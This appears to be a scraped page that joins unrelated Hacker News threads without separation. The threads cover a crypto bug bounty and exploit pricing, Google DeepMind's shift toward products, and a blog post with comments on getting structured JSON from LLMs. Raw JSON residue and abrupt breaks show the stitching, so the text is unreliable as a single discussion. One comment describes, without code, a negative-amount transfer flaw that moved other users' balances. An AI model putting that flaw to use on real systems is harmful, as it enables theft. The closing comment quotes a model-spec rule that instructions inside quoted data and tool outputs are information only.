sometimes. Its mostly the opposite of what people expect, but truth is often stranger than fiction. The MEV and Sandwicher attackers are legal, increase the transaction costs for everyone, skim profits from everyone and annoy everyone, the exploiter of a MEV bot gets charged and convicted. I don't have any problem with that, I've analyzed the sentiment of discussion though. I don't think anyone got charged and said code is law. Its more about who gets charged at all. reply j0hnyl 21 hours agorootparentprevYou could say that about anything that is critical. reply acdha 17 hours agorootparentTry thinking through other comparisons to understand the difference: if I find a bug in the power grid, how do I cash out? There aren’t many buyers, it’s really hard to move a lot of cash without getting caught, and if I use any other electronic system I have to pay a ton of money to get help laundering it because the risks are so high. Criminal outfits in Asia play games trying to get gift cards or things like that but it’s hard to scale and a lot of their dupes here get caught. Contrast that with cryptocurrency where a bunch of VC money pumped up a market for you to launder the proceeds and the protocols are intentionally designed not to have antifraud protections. Ransomware was possible a decade earlier but the profitability went up massively once it became easy to launder millions rather than hundreds of dollars. reply tptacek 15 hours agorootparentI have a general rule of exploit sales which nobody has shot me down on yet and I'm increasingly confident about: people are buying non-speculative outcomes. Every dorm room conversation about vulnerability valuation inevitably veers into speculation about what bank-shot outcomes a buyer might hope to achieve with a purchase. The reality is that unless the buyer is getting exactly an outcome they already planned (and, usually, have already repeatably achieved), they're not interested. Exploits have to slot into existing business processes. This explains reliable, stealthy, zero-interaction full-chain iOS vulnerabilities, which fit into every intelligence, military, and law enforcement business process pin-compatibly. It explains browser vulnerabilities and ATO vectors. And it also approximates the market for blockchain vulnerabilities: if the exploit is \"literally transfer untraceable cash from victims to buyer\", lots and lots of criminal organizations already have that business process; you probably simplify their existing repeatable process. Blockchain vulnerabilities thus have a very credible market. As bonus: the work of discovering and POC'ing these vulnerabilities may be gnarly, but the engineering required to exploit them at scale probably isn't. It doesn't take months of R&D to make the exploit \"reliable\", it generates straight cash until it dies (and probably has a half-life measured in minutes), and so on. Every lucrative class of vulnerability has some kind of story like this; they all fit into some existing, very clearly stated demand. We get into trouble trying to generalize. All the markets are very specific; they're all sui generis. Most vulnerabilities are worth zero. There are mobile OS RCEs that are probably worth zero! reply acdha 7 hours agorootparentThat’s a really good way to think about it. Having been security-adjacent for a long time, I definitely remember the reactions of dread which some of the earlier big vulnerabilities in things like OpenSSL got, which were never exploited at the feared scale, and that’s well explained by your theory: the NSA isn’t interested in every phone in a country, and a lot of unsexy vulnerabilities like WordPress exploits are going to be more widely attacked because people know how to make money with ad/affiliate spam, SEO, etc. reply tptacek 20 hours agorootparentprevNo, you can't. reply CyberDildonics 19 hours agorootparentI can and I do, I say it all the time. reply wepple 20 hours agorootparentprevNot really - a bug bounty gives you some type of currency. Jacking a database and trying to sell it on a DLS or dark web is a massive process. reply yieldcrv 21 hours agoparentprev> And there just aren't enough security people yet that market forces have commoditized bounty finding. I have the opposite conclusion there, crypto organization sponsored bug bounties are far more accurately valued than Web 2.0’s arbitrary adversarial bug bounties, and have attracted tons of developer talent to crypto bug bounties and the crypto ecosystem as a whole reply j0hnyl 21 hours agorootparentCrypto bug bounties require specialized low level knowledge. Web 2 pentesting is akin to a qa checklist. Imo op is right that web2 bounties are commoditized. reply yieldcrv 19 hours agorootparentMore commoditized but vastly mispriced, especially consequential ones. but there are many laymen and seasoned programmers that would consider web 2 bug bounties to be very specialized, at the same time cosmos and EVMs have been around for at least 7 years now and many devs have only done that work - which is actually a problem in recruiting as many of these specialized crypto devs are quite junior when Apple is going to fight tooth and nail to not pay you $10,000 while the black hat government contractor will pay $1,000,000 for the same exploit, the market is saying what the real price is and its at parity with what Web 3 is paying reply bigiain 18 hours agorootparentprev> and have attracted tons of developer talent to crypto And yet: \"Both issues were caught after the code had been audited, merged, and slated for release\" I wonder who did those audits? reply usmannk 17 hours agorootparentThe answer to this question is out there, but the reports are not published yet. I caution readers to not make rash judgements on their skill like this though. These bugs are really hard to find, and it was a minor miracle that I noticed these ones at all. I actually had a whole list of critical bugs in this codebase ready to report before the V2 upgrade was merged to master (which would put it in scope for a bounty). However the auditors managed to find every single bug on my list. I only noticed the ones that eventually made it here later, by a stroke of luck, and after I had already spent a ton of time looking at this codebase without noticing them. reply yieldcrv 15 hours agorootparentcongratulations ser did you try other things like try to get employed by the team, or consider submitting an altruistic pull request? or was the bug bounty the adequate incentive from the getgo reply mhluongo 18 hours agorootparentprevCool thing about the space — you can likely check the source yourself + find the audit reports! reply yieldcrv 18 hours agorootparentprevwere you being snarky about the word talent, got it, please see the forum guidelines about substantive discussion, believe it or not they apply to crypto discussion here too reply wslh 20 hours agoparentprevThe problem is that at certain level of TVL you cannot scale your security measures [1].

It's self referential and prone to negative feedback loops. They are secure because the token is expensive, the token is expensive because it provides a secure platform. Short the token, take a loan out, compromise the security, tank the value, profit.

Having the iPhone bug and the accompanying conference talk and blog post will allow you get hired by nearly any good security or tech company. No one cares about blockchain bugs except other crypto companies. When I and a bunch of other coinbase engineers were looking for jobs we were looked down at for even working in crypto. And weren’t even in the blockchain team! Just regular engineers. I myself have dedicated a couple of months to testing gnosis and curve that each have $2 million bounties but turned up short. Last year I switched to a ML based fuzzing research and was able to speak at defcon and got crazy offers after publication. reply tptacek 20 hours agorootparentSerious Chrome and iPhone bug chains can be worth this much on the market, but the amount of engineering effort that goes into supporting that kind of pricing (across all the buyers, aggregated) is extreme. The subthread that unfolds from this comment is about fuzzing, but finding a vulnerability is a small part of actually selling it on the market. Vendor bounties for these kinds of vulnerabilities are going to tend to be sharply lower than this crypto bounty, which was for a directly monetizable vulnerability. But there's a lot going into that vendor bounty price point. reply zEddSH 21 hours agorootparentprevCan you share more about ML based fuzzing?

It seems like it might be worth the gamble of taking 3-6 months off work to discover a bug of that size. reply usmannk 22 hours agoparentIt was advertised in advance, but the real gamble is on if they'll pay. If you go to my other blogpost linked in OP, you can see a case where I was owed 500k and paid 60k. You're right though that it's a lot of risk. It's not something that most of the leaderboard works full time on, though some of us do.

I have always wondered why the payouts are capped at the trillion dollar corps at such low figures. It appears like $75k max and MS and $100k max at Apple. Meanwhile shady 3rd party groups will pay you 10x that, won't they? reply cge 22 hours agorootparentCryptocurrency bug bounty programs perhaps have an advantage in that the risks of classes of bugs are often concrete, financially quantifiable, immediate, and catastrophic. A bad RCE in a mainstream OS could do untold damage to users, reputational damage to the company, and so on, but even if severe, those risks have to be estimated. But in this case, for example, it seems like the $2m bounty was for a bug that, if exploited, would have made $1b in market cap disappear. I expect it's just much simpler to convince a skeptic businessperson when the risks are so clear. reply consumer451 22 hours agorootparentThat's a very solid point, as sad as it is. I suppose the argument for OS makers to raise their rates might be that they are paying 10x below market rates, and the rates were set by the actual freaking market that exists. If I was a congressional aide, I would definitely write something up about this when my boss was going to drag a Microsoft exec across the coals in public. I would imagine that billions in gov contracts are at risk for MS right now due to lax security. A $2M bug bounty could have prevented that. reply tptacek 14 hours agorootparentprevApple outbids bottom- and mid-tier buyers, and top-tier buyers are extremely finicky about what they're buying: exploits, not vulnerabilities, for reliable bugs, with a variety of additional constraints. Apple and Google will buy exploits top-tier IC buyers won't, with less negotiation and less risk. The major parties to this market are aware of each other and are calibrating against each other; Apple and Google aren't blowing this off.

You can issue a command to transfer currency from your account to somebody else's, as that is a primary use case of a cryptocurrency. There was a code path where you could send someone negative amounts of the currency and it would happily pay them a negative amount of currency and charge you a negative amount of currency, thus transferring their account balance to your against their will. There were several transfer paths and I think not all of them were vulnerable, but only one has to be. There's a bit of indirection that made it somewhat less obvious than my description makes it sound, though it amounts to the same thing in the end. reply schoen 22 hours agorootparent> There was a code path where you could send someone negative amounts of the currency and it would happily pay them a negative amount of currency and charge you a negative amount of currency, thus transferring their account balance to your against their will. This is a bug I remember from the Apple II game \"Taipan\" (in which you play an 1800s opium-and-silk trader in East Asia). You could borrow negative amounts of money from a lender who charges extremely high interest. As a result, the lender would quickly end up owing you tremendous sums, without your having to do anything else. Wikipedia mentions this: > Note: A bug in the original game allows the player to overpay the moneylender, acquiring \"negative debt\". This \"negative debt\" will accumulate interest very quickly, and will count towards the player's net worth. As the game's vocabulary of number words ends at \"trillion\", this can cause the game to display garbage instead of the player's correct net worth. This has been fixed in the online \"for browsers\" version of the game. reply pennybanks 22 hours agorootparentprevit really shouldnt be referred to as currency as a whole anymore. well i guess anything can be a currency but its too misleading even though that was by design. if its designed to be a stock then should be called so. poker chips? in game currency? money laundering token? reward points? purchase receipt? jpeg? just think it would help reply nailer 22 hours agorootparent'Token' is the generic term people have settled on. 'Currency' is rare. A stock would be a 'tokenized equity', in the same way there's 'tokenised real estate', 'tokenised metals', 'tokenised bonds', whatever the real world asset is.

Attach seasoned product teams from Google to the research org and have experienced PMs paired with experienced EMs launch products. Trying to transition a research org into a product org is going to be needlessly painful, especially since the research org needs to be firing on all cylinders in this hyper-competitive space. reply TaylorAlexander 16 hours agoparentYep. I joined Google X Robotics (which became Everyday Robots, which got canceled) just as the org was winding down a big R&D push and moving to product development. Engineers were palpably hurt by their various projects being canceled, and in my opinion they never had a viable product strategy beyond “let’s see if we can find a consumer use for this robot”. This strategy ultimately failed and they canceled the project, let go a bunch of the people, and now the robots are being used for AI research. So the whole shift from R&D to product development was a failure. They could have saved a lot of grief and money if they just continued as an R&D org, and in my opinion they would have left open some important doors which would have really helped with AI research. reply astromaniak 13 hours agorootparentI'm afraid this is going to be another Everyday Robots or Boston Dynamics. Google is ruled by managers, not visionaries. Strategy is 'try and see if it works in 4 years. if not cancel'. They followed it in many cases. So, DeepMind's cancellation is long overdue. A couple of years back one of Google's top managers talking about AGI said it's most likely to happen in DM. But current LLM boom happened elsewhere. Likely managers are disappointed in DM. reply aborsy 13 hours agorootparentTo fair, Google invented transformers and contributed a lot of basic research. OpenAI made it bigger. reply Rinzler89 8 hours agorootparentAnd Xerox invented the GUI and Kodak the digital camera, and look at them today. Inventing things is no guarantee of success. reply robertlagrant 7 hours agorootparentYes, but look at the previous comment. How does \"inventing transformers\" marry with \"Google has managers not visionaries\"? reply jsjohnst 6 hours agorootparentJust because a company is 99% one thing, doesn’t mean that the 1% remaining don’t have moments of real genius. What it does mean however is that when those real genius moments happen, the company isn’t in a good position to capitalize on it (ala Xerox or Kodak mentioned previously, but there are so many more). reply ToucanLoucan 4 hours agorootparentprevBecause that's the hallmark of business-minded people being at the helm and not engineers, which has been an issue for Google for a long time: the greatest inventions ever seen will be squandered in terms of the org itself because management can't see beyond the next few quarters and won't invest properly in it. reply TaylorAlexander 11 hours agorootparentprevWell, LLMs are not AGI. They have serious limitations [1] and honestly my fear is that it’s too soon. I agree Google is ruled by managers (that’s why I hated it), and my fear is that the managers have FOMO and want to push to productize asap even tho the tech isn’t ready yet. Look what happened when Google tried to throw an LLM in to search. Absolute shitshow. That’s not ready to become any kind of product! If they kill R&D now to focus on productizing something that is half baked, they will fail to develop those new inventions which might get us to AGI. When I worked at Google X Robotics I was hired on to the remnants of the last research team, which was dissolved six months after I started (I was moved to hardware test engineer). Our subteam really wanted to research multi-finger grippers but we got overruled, so the robot had to do everything with a two finger pinch gripper. Which is fine for research but absolutely unsuitable for real world tasks. It couldn’t even operate a spray bottle without special attachments and they thought it was going to clean people’s homes! [1] I am sharing this one a lot lately but I’m very moved by Yann LeCun’s arguments about the limits of autoregressive approaches here. As a robotics engineer I have been dismayed at all the attention LLMs are getting despite serious limitations that make them generally unsuitable to solve some of the most important problems in robotics. https://youtu.be/1lHFUR-yD6I reply robertlagrant 7 hours agorootparent> my fear is that the managers have FOMO and want to push to productize asap even tho the tech isn’t ready yet This is exactly it. With the limitations ChatGPT is encountering around safety and hallucination, Google probably should've just said \"we're working on something awesome - hold on\" and kept plugging away before releasing, instead of ex-Product CEO making them release something now, even if half of the demo video is fake. reply KoolKat23 4 hours agorootparentBut stonks don't go up then.

I've flipped between R&D and product development a few times in my career, sometimes at the same company, and it's a really rough transition even for an individual experienced in both. I can't imagine trying to flip a whole research team to make products is going to go well, especially when the products are getting a ton of well-deserved bad press and a lot of those researchers were coming from academia rather than elsewhere in industry in the first place reply stephen_cagle 13 hours agoparentprevI tend to agree. I'm curious whether this is Deepmind saying \"I think we could do things better, let's do this ourselves\" or the leadership of Alphabet saying \"Get these ivy league intellectuals to prioritize productionizing products!\" Would seem far more sensible to allow Deepmind to continue to release hit after hit in the ML research world, and simply embed \"fly on the wall\" PM's into their org that can independently productionize any golden nuggets they happen to create. reply TeMPOraL 12 hours agorootparentI feel it's more of leadership of Alphabet saying, \"Our people literally invented transformers, so how come we're at the bottom of AI race instead of at the top? A random non-profit took out research and run with it, and they're the hottest company in the world now. This is unacceptable![0]\". Bad idea. People good or lucky enough to land in R&D like doing R&D.

There's plenty of smart hardworking people out there who continue to contribute but never stumble upon a unicorn. To a large extent its luck, a much larger contributor than people realize. All you can do is to play the game, consistently contribute and work hard on R&D and products and you improve your odds of stumbling upon success. But it's never guaranteed. reply smallnamespace 11 hours agorootparentprevYes, but that doesn't explain how OpenAI able to walk and chew bubble gum at the same time, unless you think there is some extra spark that Google is lacking. reply TeMPOraL 11 hours agorootparentI think OpenAI was chilled out, and mostly lucky. Chilled in the sense that Google seems to be too full of itself, and their practice of publishing groundbreaking research without actually publishing anything other people can use is, frankly, annoying. OpenAI managed to leapfrog them by slapping a chat interface on a tuned GPT-3 and putting it on the Internet. The chat service bit is them being chill, but the real spark was the model. I say they were lucky, because AFAIK back then no one expected LLMs to show so many and so advanced general capabilities. This took everyone by surprise, and since people could already play with it, ChatGPT took off on its own - it had so much real, transformative value, that it spread out with zero marketing. That's a rare, bona fide case of \"word of mouth\", it was just that useful. But that wasn't a strategy, that was luck. To their credit though, OpenAI turned this early win into an opportunity and is excellent at exploiting it. Being small helps. reply ethbr1 4 hours agorootparent> it had so much real, transformative value, that it spread out with zero marketing IMHO, in retrospect, the failure gradient of early LLMs is underappreciated in driving adoption. Windows 95 failure: blue screen with inscrutable error code. Everyone noticed that. LLM failure: run-around non-answer (user shrugs and tries again) or confident and plausible incorrect answer (user doesn't recognize this without research). Essentially, the ways in which LLMs didn't work were the most hidden and hardest to discover failure mode. Which was perfectly tuned for the \"I'm going to try this thing for 5 minutes and be amazed\" first impression. Which allowed subsequent generations to backfill the capability gaps. Tl;dr - We shouldn't underappreciate quiet-failing as a product adoption driver. reply cma 5 hours agorootparentprevGPT-3 was out for years already for Googlw to see, but with what OpenAI saw of it they began training an expensive GPT-4, before chatgpt success, maybe started before RLHF. reply hot_gril 1 hour agoparentprevMaybe that's what they're doing.

Who do you think has that expertise? The people working on the model or the people studying users? reply 4death4 16 hours agorootparentDefinitely the people working on the model. It ultimately doesn’t matter what the users want because you can’t arbitrarily deliver an experience. You can only deliver what it’s possible to extract from the model, so growing the possible things the model can do well is most important. reply ethbr1 15 hours agorootparentEngineering and product are both important. Without engineering, you don't have the capability. Without product, you don't build something users are actually interested in. I've seen too many engineering teams try to productize what they want, not what people not-them want, and then be flummoxed by lack of adoption. Nothing sucks more than burning the midnight oil to nail a target... that ended up being 2m to the right of the actual target. reply geodel 5 hours agorootparentprevIf engineering/research is all mattered we would have maybe two order of magnitude more successful products or companies. Because product-market fit is a thing we don't have any successful research turning to successful product. reply rusticpenn 11 hours agorootparentprevI have experience in both R&D and product. Both need different approaches to work. The goals of people working on the model will be different from product people. As mentioned by the other user, a product team can look at things produced from research and see how it can bring it to users. reply hobs 6 hours agorootparentprevIn my mind you could not be proving that we need product people more. They'd never say \"It ultimately doesn’t matter what the users want\" - they'd say \"let's find a way to build what users want\" not \"let's grow the possible things a model can do well\". reply dylan604 14 hours agoparentprevIsn't this the mindset that has PoCs released to production? reply lupire 17 hours agoparentprevThe researchers aren't suddenly building products. reply Vt71fcAqt7 17 hours agoparentprev>seasoned product teams from Google . reply kevindamm 20 hours agoprevOne thing that classic Google did right was embed researchers into product groups. It's true there were always some teams that were pure research but for the most part researchers were working within a product group. Then some acquisitions and internal musical chairs and it became less like that. Now I'm not all doom and gloom like this article (although with DeepMind why not leave well enough alone? They do excellent research). But, it does seem suboptimal to pivot all the way to AI Product Factory... were there no other existing product factories they could have turned instead? reply flakiness 17 hours agoparentThe heads of the research once wrote about that. They called it a \"Hybrid Approach to Research\" (as other comments pointed out). https://static.googleusercontent.com/media/research.google.c... reply moandcompany 11 hours agorootparentThe \"Hybrid Approach to Research\" paper describes how \"Google Research\" first started when Google was mostly, if not entirely, about Search and \"Research\" was part of the Search organization. In these days, there were no \"pure research\" roles, nor were there formal designations for \"research scientists\" as a career ladder at Google. There were \"SWEs\" and in some cases \"Members of Technical Staff.\" Since then, \"Research\" became its own organization or \"Product Area\" at Google (i.e. the equivalent of a company division). \"Google Brain\" was also created. Deepmind was acquired. All of these existed simultaneously, however Deepmind remained as an organizationally separate entity. In this era, the \"Research Scientist\" role was created, which generally existed exclusively within \"Google Research.\" A large span of this era had John Giannandrea (\"JG\") at the helm of the Google Research org; (note: Giannandrea left to head and build Apple's \"AI/ML\" organization, which includes Siri, a few years ago. After JG's departure, Google Brain and Google Research were brought together under the common leadership of Jeff Dean, as an organization called still called \"Google Research\" with a branch still called \"Google Brain.\" For perspective, it may be useful to consider too that the size of \"Google Research\" in staff headcount here measured in the several-thousands. This configuration existed for the last few years, with the latest changes being the merging of \"Google Research\" and Deepmind into \"Google Deepmind.\" - I am a Xoogler, formerly from this product area. One of the things I and at least a few others observed was that \"Research\" was becoming defacto synonymous with \"Machine Learning / AI,\" yet not all of Google's storied research accomplishments, or problem areas, are limited to Machine Learning and AI. In the last few years, Google made its public statements of being an \"AI-first,\" previously \"mobile-first,\" company in recognition that it would be incorporating and leveraging ML and AI technology across all of its products and services. This raised a significant question: What should \"Google Research\" or Research at Google be if product areas across Google began full incorporation of AI/ML technology and methods in their products? What if they incorporated their own AI/ML teams? If Google was truly successful at becoming AI-first, how should \"Google Research\" define and focus its organizational purpose, research portfolio, and show its value when Moonshots/X also exists within Alphabet? Over time, there were many parts of \"Google Research\" and research at large across Alphabet that felt that their purpose, or at least their individual reason for joining, was to do \"pure research,\" yet this is not how the organizations started at all in the beginning. Many researchers and teams also knew that for practical reasons (e.g. promotion) that they generally needed to present and align their work with things like product launches with partner organizations. I suppose we are seeing some of the answer to this with Google DeepMind stating that they will be aligning more strongly with creating AI products, but in addition to the question of what happens to foundational research (for AI), what happens to foundational research in non-AI areas for Google and Alphabet? reply curious_cat_163 19 hours agoparentprevI agree: hybrid teams with a diversity of product/research skills at the team level is the way to go. It is thinkers and doers that need to come together. It is way easier said than done, though. You need true buy in from a ton of stakeholders — employees being the primary ones. And people get set in their ways. I do like a product bias though. Not because it is more valuable somehow but because it provides the applied scientists deeper exposure to the problem space, early and often. reply ethbr1 15 hours agoprev> Hassabis says that he’s learning more about introducing products and that Google’s product teams, in turn, are dealing with the novel challenges of generative AI, which has the potential to behave unusually when placed in the hands of the general public.

    "originBody": "May 30, 2024 Every Way To Get Structured Output From LLMs By Sam Lijin - @sxlijin Update (Jun 18): check out the discussion on Hacker News and /r/LocalLLaMA! Thanks for all the feedback and comments, folks- keep it coming! This post will be interesting to you if: you're trying to get structured output from an LLM, you've tried response_format: \"json\" and function calling and been disappointed by the results, you're tired of stacking regex on regex on regex to extract JSON from an LLM, you're trying to figure out what your options are. Everyone using LLMs in production runs into this problem sooner or later: what we really want is a magical black box that returns JSON in exactly the format we want. Unfortunately, LLMs return English, not JSON, and it turns out that converting English to JSON is kinda hard. Here's every framework we could find that solves this problem, and how they compare. (Disclaimer: as a player in this space, we're a little biased!) Comparison Framework Language Support Does it handle or prevent malformed JSON? How do I build the prompt? Do I have full control over the prompt? How do I see the final prompt? Supported Model Providers API flavors How do I define output types? Test Framework?

Haven't included it in the list because it seems more low-level than the others, and setup is very involved. 1: Applying constraints to OpenAI models can be very error-prone, because the OpenAI API does not expose sufficient information about the underlying model operations for the framework to actually apply constraints effectively. See this discussion about limitations from the LMQL documentation. 2: Transformers refers to \"HuggingFace Transformers\" 3: Constrained streaming generation produces partial objects, but no good ways of interacting with the partial objects, since they are not yet parse-able. We only consider a framework to support streaming if it allows interacting with the partial objects (e.g. if streaming back an object with properties foo and bar, you can access obj.foo before bar has been streamed to the client). Criteria Most of our criteria are pretty self-explanatory, but there are two that we want to call out: Does it handle/prevent malformed JSON? If so, how? LLMs make a lot of the same mistakes that humans do when producing JSON (e.g. a } in the wrong place or a missing comma), so it's important that the framework can help you handle these errors. A lot of frameworks \"solve\" this by feeding the malformed JSON back into the LLM and asking it to repair the JSON. This kinda works, but it's also slow and expensive. If your LLM calls individually take multiple seconds already, you don't really want to make that even slower! There are two techniques that exist for handling or preventing this: actually parse the malformed JSON (BAML takes this approach) or constrain the LLM's token generation to guarantee that valid JSON is produced (this is what Outlines, Guidance, and a few others do). Parsing the malformed JSON is our preferred approach: it most closely aligns with what the LLM was designed to do (emit tokens), is fast (takes microseconds), and flexible (allows working with any LLM). It does have limitations: it can't magically make sense of completely nonsensical JSON, after all. Applying constraints to LLM token generation, by contrast, can be robust, but has its own issues: doing this efficiently requires applying runtime transforms to the model itself, so this only works with self-hosted models (e.g. Llama, Transformers) and does not work with models like OpenAI's ChatGPT or Anthropic's Claude. Can you see the actual prompt? Do you have full control over the prompt? You might remember this from \"Fuck You, Show Me The Prompt\". Prompts are how we \"program\" LLMs to give us output. The best way to get an LLM to return structured data is to craft a prompt designed to return data matching your specific schema. To do that, you need to see the prompt actually getting sent to ChatGPT, and try different prompts. Most frameworks, unfortunately, have hardcoded templates baked in which prevent doing this. Example code For each framework listed above, we've included example code, from the framework's documentation, provides for how you would use it.

Most other libraries do reprompting or rely on constraining grammars which require owning the model. Reprompting = slow + $$, constraining grammars = require owning the model. we just tried a new approach: parse the output in a more clever way. reply StrauXX 11 hours agoprevDid I understand the documentation for many of these libraries correctly in that they reprompt until they receive valid JSON? If so I don't understand why one would do that when token masking is a deterministicly verifyable way to get structured output of any kind (as done by Guidance and LMQL for instance). This is not meant to be snarky, I really am curious. Is there an upside to reprompting - aside from easier implementation. reply frabcus 11 hours agoparentMy experience with models even about a year ago is that the model has firmly decided what it thinks by the time of the last layer, so the probabilities on that layer aren't very useful. You either get the same (in this case wrong) thing differently worded, or worse you get effectively noise if the second probability is very much lower than the largest probability. My guess is that applies here too. Better to let all the layers rethink the tokens, than force hallucination of eg a random letter when you don't expect an angle bracket (Edit: above is assuming using logprobs and/or logit_bias with the OpenAI API, not some other masking technique) reply HeatrayEnjoyer 11 hours agorootparentWhy not apply it at an earlier layer then? reply anonymoushn 7 hours agorootparentAt earlier layers the activations don't correspond as cleanly to tokens, and I expect that vendor APIs for proprietary LLMs wouldn't let you do anything like this. reply hellovai 11 hours agoparentprevthe main one is that most people don't own the model. so if you use openai / anthropic / etc then you can't use token masking. in that case, reprompting is pretty much the only option reply michaelt 7 hours agorootparentIn the specific cases of openai and anthropic, both have 'tool use' interfaces which will generate valid JSON following a schema of your choice. You're right, though, that reprompting works with pretty much everything out there, including hosted models that don't have tool use as part of their API. And its simple too, you don't even need to know what \"token masking\" is. Reprompting can also apply arbitrarily criteria that are more complex than just a json schema.

Considering most modern languages are LL(k), that is you need at most k tokens to parse the output (tbf these are programming language tokens not LLM tokens), with k=1 being the most common choice, would it not be reasonable to expect to only have to regenerate only a handful of tokens at most? reply joatmon-snoo 10 hours agorootparentAuthor here- yes, reprompting can work well enough if the latency hit is acceptable to you. If you’re driving user-facing interactions with LLMs, though, and you’re already dealing with >1min latency on the first call (as many of our current users are!), waiting for another LLM call to come back is a really frustrating thing to block your UX on. reply Havoc 9 hours agoparentprevFor local models you can use grammars to constrain it directly. reply politelemon 12 hours agoprevStructured output should not be assumed is limited to JSON.

Fortunately the same author have a blog post (https://www.boundaryml.com/blog/type-definition-prompting-ba...) explaining how their approach works and how it compares to instructor (https://github.com/jxnl/instructor). Basically these libraries provide two things: 1. A way to prompt the LLM 2. A way to get a valid JSON For 1. instructor does it through the json schema definition, BAML's innovation is that they use a simplified lossless schema definition that uses less tokens. For 2. instructor does it through reprompting until they receive a valid JSON. BAML's innovation is a fuzzy parser able to to parse non-perfect JSON. Personally I think that there is no need to all these abstractions to get structured outputs from LLMs. A simple .to_prompt() function that takes a pydantic and translate it into some prompt block you can add to your prompt and a retry is sufficient to get the same results. reply Jayakumark 5 hours agoparentWill you be able to share an example code or gist ? reply resiros 50 minutes agorootparentIf you look into the instructor code(https://github.com/jxnl/instructor/blob/06a49e7824729b8df1f7...).

For example in baml: class Resume { name string education Education[] @description(\"Extract in the same order listed\") skills string[] @description(\"Only include programming languages\") } Could be expressed in Python like this: class Resume: name: str education: List[Education] # Extract in the same order listed skills: List[str] # Only include programming languages Two benefits I see are that it would make the file leaner (because Python is nicely lean) and provide free parsing and syntax highlighting. Is there a benefit of rolling your own DSL? reply GeneralMayhem 11 hours agoparentTwo big advantages. First, if you want a declarative config with limited, domain-specific options, rolling your own DSL instead of using something as complex as Python is much, much easier to implement. You're not actually going to be running the code either way, at least not in the normal way, and the Python syntax tree is pretty complicated. Second, having code that looks like Python can lead your users to believe that it is in, in fact, Python. When you're doing things like using your DSL as configuration that happens at setup time, but then actually \"running\" the resulting config later on, that can lead to people getting themselves into trouble - for instance, they might try to use `time.now()` and end up embedding the time of the config parser as a constant in their workflow definition. If you want to use Python as your language, you probably want to define your \"DSL\" as a Python library, so that you can use a normal interpreter to work with it. Maybe you have library functions that return config objects, and a user's \"configuration\" is an arbitrary Python file with a standard function name as an entry point. But then when you want to introspect over types, you probably need to start playing games with decorators, which is tricky again, and you have to be very careful to have that evaluation step return meaningful errors. Starlark (https://github.com/bazelbuild/starlark) is an example of using Python-ish as a \"configuration\" language. That took an absolutely massive amount of engineering to get to be well-defined, and was only arguably worth it because they wanted a language that's a loop construct away from being Turing-complete. If they had wanted a basic declarative relationship language, they probably would have used textprotos or GCL. reply mejutoco 10 hours agoparentprevUsing Pydantic also looks very close to the DSL (trivial to translate mechanically) https://docs.pydantic.dev/latest/concepts/models/#dynamic-mo... reply hellovai 11 hours agoparentprevthat's a great question, there's three main benefits: 1. seeing the full prompt, even though that python code feels leaner, somehow you need to convert it to a prompt. a library will do that in some way, BAML has a VSCode playground to see the entire prompt + tokenization. If we had to do this off of python/ts, we would run into the halting problem and making the playground would be much much harder. 2. there's a lot of codegen we do for users, to make life easier, e.g. w/o BAML, to now do streaming for the resume, you would have to do something like this: class PartialResume: name: Optional[str] education: List[PartialEducation] skills: List[str] and then at some point you need to reparse PartialResume -> Resume, we can codegen all of that for you, and give you autocomplete, type-safety for free. 3. We added a lot of static analysis / jump to definition etc to JINJA (which we use for strings), and that is much easier to navigate than f-strings. 4. Since its code-gen we can support all languages way easier, so prompting techniques in python work the same exact way for the same code in typescript. reply xkgt 9 hours agoprevI was recently researching structured output generation for my project and I enjoyed using Outlines library a lot. It felt quite fast as it uses FSM and indexing. There are few fine prints though: 1. Sometimes constraints can decrease the quality of the output since syntax of the response is prioritized more than quality of the response 2. For memory constrained inferences, certain sampling strategies like top-k can cause OOM errors if the max_token is too high. I haven't tested that it is entirely due to structured generation but I suppose it is possible for certain regexes. 3. Vision models and other multi-modal models are not supported yet.

A couple important dimensions are missing here: - is the structured output obtained via prompts or logits/probabilities? The latter is more reliable but is limited to LLM APIs that expose and allow logit_bias specification - does the framework allow specification of how to handle the tool? The list seems to only include libraries that focus on structured-output generation, but there are libraries, such as Langroid[1] (1K installs/week), which do many other things in addition to this. Langroid is a Multi-Agent LLM framework from ex-CMU/UW-Madison researchers. It has prompt-based structured-output generation, works with any LLM, and is used by companies in production. Users can specify the structure using a Pydantic class derived from ToolMessage[2], along with few-shot examples special instructions, which are transpiled into the system prompt. A \"handle\" classmethod can also be defined, to specify how to handle the tool.

A large portion of our users switch to BAML because they actually \"just want to see the damn prompt\". reply jari_mustonen 7 hours agoprevA half year ago (a long time, I know), I tried to get structured answers from GPT-4. The structure was not complex, but I needed to extract a specific answer like \"Please identify and categorize the following text as A or B\" or \"Please grade the following text on criteria A on a scale from 1 to 10\". First, I noticed that enforcing a JSON format on output generally lowered the quality of the results. Referring to JSON seemed to primed the LLM to be more \"programmatical.\" Second, I noticed that forcing LLM to answer with a single word is next to impossible. It won't do it consistently, and generally, it lowers quality. Here's what I eventually learned: Markdown is a machine-readable enough for post-processing and easy output format for LLMs. I give the structure (a list of headings) for the LLM, which conforms to them 100% of the time. I always had a section called \"Final Comments\" where the LLM can blather away the things that it sometimes just needs to say after giving the answer. This can be then ignored when parsing the answer. Also, it is good to understand that LLMs do better when you allow them to \"think aloud.\" This Markdown output is good for that. reply LeifCarrotson 7 hours agoparent> I always [add] a section called \"Final Comments\" where the LLM can blather away the things that it sometimes just needs to say after giving the answer.

Instead you should be doing your unit of work and then following up with a different request/model to parse it into json or your flavor of structure. - Grading on numerical scales introduces weird bias. I never went down the route too far but I would notice certain floating point numbers would show up too often when using numerical scales. Using a word based scale works a lot better. reply simonw 6 hours agoparentprevI've found the most effective trick for this is to use examples. With the messages array format you can even \"fake\" previous interactions to provide examples of what you want to happen - send in several prompt / example-response pairs and most models will get the idea pretty quickly. reply kseifried 3 hours agoprevSo in my experience, even if you get the LLM to output JSON, it might do things like: * Helpfully include \"json ```\" at the start or text like \"here's the JSON output you asked for\" * Use a smart quote randomly instead of a regular quote to wrap a string * add some random unicode characters (zero width spaces, just why?) You can grab it at: https://github.com/CloudSecurityAlliance/csa-ai-clean-json-o... EDIT: also added a note on JSON input/output with respect to ChatGPT: Also something most people seem to have missed with respect to LLM's and JSON: https://cdn.openai.com/spec/model-spec-2024-05-08.html On the input side: By default, quoted text (plaintext in quotation marks, YAML, JSON, or XML format) in ANY message, multimodal data, file attachments, and tool outputs are assumed to contain untrusted data and any instructions contained within them MUST be treated as information rather than instructions to follow. This can be overridden by explicit instructions provided in unquoted text. We strongly advise developers to put untrusted data in YAML, JSON, or XML format, with the choice between these formats depending on considerations of readability and escaping. (JSON and XML require escaping various characters; 